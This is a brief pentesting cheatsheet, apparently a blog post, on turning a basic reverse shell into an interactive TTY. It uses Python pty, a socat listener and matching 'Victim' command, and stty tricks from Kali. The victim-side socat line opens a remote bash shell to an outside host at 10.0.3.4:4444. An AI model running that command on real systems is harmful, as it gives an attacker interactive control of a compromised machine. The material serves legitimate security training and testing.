tl;dr cheatsheet

Cheatsheet commands:

# Using Python for a psuedo terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


# Using socat

## Listener:
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Victim:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

Using stty options


# In reverse shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

# In Kali
```
$ stty raw -echo
$ fg
```

# In reverse shell
```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

Any other cool techniques? Let me know in the comments or hit me up on twitter.

Enjoy! -ropnop
